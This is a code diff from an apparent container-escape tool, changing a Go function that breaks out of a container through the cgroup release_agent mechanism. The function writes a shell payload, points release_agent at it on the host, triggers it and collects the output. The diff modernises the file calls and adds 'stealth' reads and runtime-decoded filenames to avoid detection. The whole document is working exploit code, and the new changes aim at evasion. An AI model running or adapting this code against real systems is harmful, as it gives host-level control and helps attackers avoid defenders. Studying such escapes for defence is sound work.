@@ -21,7 +21,6 @@ package escaping
 
 import (
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"strconv"
@@ -129,7 +128,7 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 	fmt.Printf("final shell payload is: \n\n")
 	fmt.Println(expShellText)
 
-	err = ioutil.WriteFile(outFile, []byte(expShellText), 0777)
+	err = os.WriteFile(outFile, []byte(expShellText), 0777)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "write shell payload failed"}
 	}
@@ -160,22 +159,22 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 	}
 	defer func() { _ = os.RemoveAll(mountPointPath + subgroupName) }()
 	// enable notify_on_release
-	err = ioutil.WriteFile(mountPointPath+subgroupName+"/notify_on_release", []byte("1"), 0644)
+	err = os.WriteFile(mountPointPath+subgroupName+"/notify_on_release", []byte("1"), 0644)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot enable notify_on_release"}
 	}
 	// write release_agent (filename decoded at runtime; no plaintext literal)
 	releaseAgentFile := mountPointPath + util.CgroupReleaseAgentFile()
-	previousReleaseAgent, restoreReleaseAgent := ioutil.ReadFile(releaseAgentFile)
-	err = ioutil.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
+	previousReleaseAgent, restoreReleaseAgent := util.StealthReadFile(releaseAgentFile)
+	err = os.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cgroup release control file is not writable"}
 	}
 	defer func() {
 		if restoreReleaseAgent == nil {
-			_ = ioutil.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
+			_ = os.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
 		} else {
-			_ = ioutil.WriteFile(releaseAgentFile, []byte{}, 0644)
+			_ = os.WriteFile(releaseAgentFile, []byte{}, 0644)
 		}
 	}()
 
@@ -190,7 +189,7 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 		log.Printf("Trigger Release Error: %s \n", err.Error())
 	}
 	// write PID to cgroup.procs
-	err = ioutil.WriteFile(mountPointPath+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
+	err = os.WriteFile(mountPointPath+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
 	if err != nil {
 		log.Printf("Write PID to cgroup.procs failed: %s \n", err.Error())
 	}
@@ -207,7 +206,7 @@ func EscapeCgroup(cmd string, subSystemName string) error {
 		// upperdir (hostPath+outputFile), which surfaces back through the
 		// container's own /. Do NOT prefix hostPath — that host path is not
 		// visible from inside the container.
-		retRes, err = ioutil.ReadFile(resultFile)
+		retRes, err = util.StealthReadFile(resultFile)
 		if err == nil {
 			break
 		}
